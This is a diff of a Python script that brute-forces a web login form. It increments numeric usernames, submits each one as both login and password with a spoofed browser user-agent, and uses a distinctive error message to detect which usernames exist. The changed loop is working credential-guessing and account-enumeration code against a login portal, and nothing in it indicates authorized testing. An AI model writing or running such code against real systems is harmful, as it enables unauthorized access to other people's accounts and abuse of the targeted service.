@@ -18,34 +18,31 @@ header = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
 }
 
+usrename_length = len(username_main)
+isLength = True
+
+while len(username_main)!=length:username_main = str(username_main)+"0"
+
+username_number = int(username_main)
+
 while(True):
+    username_number += 1
+    username = username_number
+    print(username)
+    body = {
+        "txtLogin":username,
+        "txtPasswd":username,
+        "btnLogin":"Login",
+        "reqUrl":"https://google.com/",
+        "reqCheck":"false"
+    }
 
-    for i in range(10**(length-len(username_main))):
-        isLength = True
-        username = username_main+str(i)
-        while isLength:
-            if(len(username)==length):
-                isLength = False
-                print(username)
-            else:
-                username = str(username)+"0"
-
-        body = {
-            "txtLogin":username,
-            "txtPasswd":username,
-            "btnLogin":"Login",
-            "reqUrl":"https://google.com/",
-            "reqCheck":"false"
-        }
-
-        try:
-            res = request_session.post(url=url,headers=header,data=body)
-            if "Loginname or Password is invalid! (2)" in res.text:
-                print(f"Username is : {username}")
-                break
-        except:pass
-
-    break
+    try:
+        res = request_session.post(url=url,headers=header,data=body)
+        if "Loginname or Password is invalid! (2)" in res.text:
+            print(f"Username is : {username}")
+            break
+    except:pass
 
 def getRun():
     df = open('app_status.txt', 'r', encoding='utf-8')
